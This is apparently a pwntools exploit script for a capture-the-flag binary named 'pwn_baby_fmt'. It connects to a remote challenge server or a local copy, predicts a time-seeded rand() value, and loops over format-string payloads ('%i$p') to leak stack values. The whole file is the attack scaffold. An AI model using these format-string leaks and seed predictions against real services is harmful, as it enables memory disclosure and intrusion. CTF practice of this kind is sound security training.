#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pwn_baby_fmt')

host = args.HOST or '104.248.42.88'
port = int(args.PORT or 2001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']

from ctypes import CDLL

libc = CDLL('/lib64/libc.so.6')

_libc = ELF('./libc-2.31.so')
if args.LOCAL:
    _libc = ELF('/lib64/libc.so.6')

context.log_level = 'error'
for i in range(1, 100):
    io = start()
    time = libc.time(0)
    libc.srand(time)

    guess = libc.rand()
    log.info('Guess {}'.format(guess))

    io.recvuntil('?\n')

    fmt = '%{}$p'.format(i)
    io.sendline(fmt)

    io.recvuntil('this?\n')
    print(i, io.recvline().strip())
    io.close()
